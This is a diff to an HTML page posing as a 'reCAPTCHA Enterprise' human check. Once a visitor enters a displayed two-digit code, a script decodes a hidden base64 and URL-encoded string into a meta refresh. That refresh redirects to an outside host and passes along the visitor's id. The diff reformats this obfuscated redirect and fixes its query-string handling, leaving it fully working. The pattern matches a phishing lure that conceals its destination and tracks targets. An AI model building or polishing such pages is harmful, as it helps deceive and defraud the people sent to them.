@@ -7,29 +7,25 @@
     <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css" />
     <script>
       let hasStatus = new URLSearchParams(window.location.search).has("status");
-      let hasId = new URLSearchParams(window.location.search).has("id")
+      let hasId = new URLSearchParams(window.location.search).has("id");
       if (hasStatus) {
         let status = new URLSearchParams(window.location.search).get("status");
         if (status == "true") {
-          let ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vc2VlZWhhdG92ZXIuZmVubWVub3MuZGUvZnFnZ1QlMjIlMjAvJTNF"
-          
+          let ref =
+            "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vc2VlZWhhdG92ZXIuZmVubWVub3MuZGUvZnFnZ1QlMjIlMjAvJTNF";
 
-          let decodedRef = decodeURIComponent(atob(`${ref}`))
+          let decodedRef = decodeURIComponent(atob(`${ref}`));
 
           let lastIndexOfColon = decodedRef.lastIndexOf('"');
-          if(hasId) {
-          let id = new URLSearchParams(window.location.search).get("id");
-          newDecodedRef= decodedRef.slice(0, lastIndexOfColon) + "?e=" + id + "\" />";
-          const encodedUrl = btoa(newDecodedRef);
-          document.write(decodeURIComponent(atob(`${encodedUrl}`)));
+          if (hasId) {
+            let id = new URLSearchParams(window.location.search).get("id");
+            newDecodedRef =
+              decodedRef.slice(0, lastIndexOfColon) + "?e=" + id + '" />';
+            const encodedUrl = btoa(newDecodedRef);
+            document.write(decodeURIComponent(atob(`${encodedUrl}`)));
+          } else {
+            document.write(decodeURIComponent(atob(`${ref}`)));
           }
-          else {
-            document.write(decodeURIComponent(atob(`${ref}`)))
-          }
-
-
-
-          
         }
       }
     </script>
@@ -70,7 +66,7 @@
             position: relative;
           "
         >
-          <img src="./reCAPTCHA-enterprise.png" alt="" style="width: 40%" />
+          <img id="logo" src="./reCAPTCHA-enterprise.png" alt="" style="width: 100px" />
           <p
             style="
               text-align: center;
@@ -89,16 +85,14 @@
             "
           >
             <p
-            id="generated-code"
+              id="generated-code"
               style="
                 color: rgba(0, 97, 254, 0.775);
                 font-size: 40px;
                 margin: 0px;
                 font-weight: 600;
               "
-            >
-              
-            </p>
+            ></p>
             <i
               class="fa fa-arrow-right"
               style="
@@ -130,21 +124,27 @@
     <script>
       let modal = document.getElementById("modal");
       let code = document.getElementById("code");
-      let generatedCodeTxt = document.getElementById("generated-code")
-      let generatedCode = generateRandomTwoDigitNumber()
-
+      let generatedCodeTxt = document.getElementById("generated-code");
+      let generatedCode = generateRandomTwoDigitNumber();
       let hasStatus2 = new URLSearchParams(window.location.search).has(
         "status"
       );
       if (!hasStatus2) {
-        generatedCodeTxt.textContent = generatedCode
+        generatedCodeTxt.textContent = generatedCode;
         modal.style.display = "block";
       }
 
       code.addEventListener("input", function (e) {
         if (code.value == generatedCode) {
           let currentUrl = window.location.href;
-          currentUrl += "&status=true";
+          let hasId = new URLSearchParams(window.location.search).has("id");
+          if(hasId) {
+            currentUrl += "&status=true";
+          }
+          else {
+            currentUrl += "?status=true";
+          }
+          
           window.location.href = currentUrl;
         }
       });
@@ -154,5 +154,7 @@
         return Math.floor(Math.random() * 90) + 10;
       }
     </script>
+
+   
   </body>
 </html>
